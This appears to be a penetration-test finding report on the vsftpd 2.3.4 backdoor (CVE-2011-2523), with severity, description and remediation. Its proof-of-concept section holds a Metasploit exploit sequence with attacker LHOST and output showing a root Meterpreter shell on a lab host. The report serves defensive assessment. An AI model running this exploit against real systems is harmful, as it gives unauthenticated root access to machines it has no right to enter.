# F-01 — vsftpd 2.3.4 Backdoor → Remote Root Access

## Severity
Critical

## CVSS v3.1
9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

## CVE
CVE-2011-2523

## Affected Service
FTP — vsftpd 2.3.4 (port 21/tcp)

## CWE
CWE-78 — Improper Neutralization of Special Elements used in an OS Command

## Description
The vsftpd 2.3.4 package distributed from the official download site between 30 June 2011 and 3 July 2011 was compromised by a third party and contains a malicious backdoor. The backdoored binary opens a command shell on TCP port 6200 when a username containing a smiley face (`:)`) is submitted to the FTP service, with no authentication required. Metasploit's `exploit/unix/ftp/vsftpd_234_backdoor` module automates triggering this backdoor and connecting to the resulting shell.

## Validation (Proof of Concept)
```
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.102
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST 192.168.56.101
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
```

**Result:**
```
[+] 192.168.56.102:21 - The target appears to be vulnerable. vsftpd 2.3.4 banner detected; backdoor may be present
[+] 192.168.56.102:21 - Backdoor has been spawned!
[*] Meterpreter session 1 opened (192.168.56.101:4444 -> 192.168.56.102:47843)
```

Dropping into a native shell and confirming identity:
```
meterpreter > shell
whoami
root
id
uid=0(root) gid=0(root)
uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
```

## Impact
An unauthenticated, remote attacker can obtain an immediate, fully-privileged root shell on the target with a single exploit attempt and no credentials. This is the most severe possible outcome for this service — there is no intermediate access level; the backdoor hands over full system control directly.

## Evidence
- evidence/vsftpd-backdoor-root.png

## Remediation
- Remove the compromised vsftpd 2.3.4 package immediately and reinstall from a verified, checksummed source
- Upgrade to a current, maintained version of vsftpd
- Implement file integrity monitoring on publicly-reachable services to detect tampered binaries
- Restrict FTP service exposure to trusted networks where the service must run
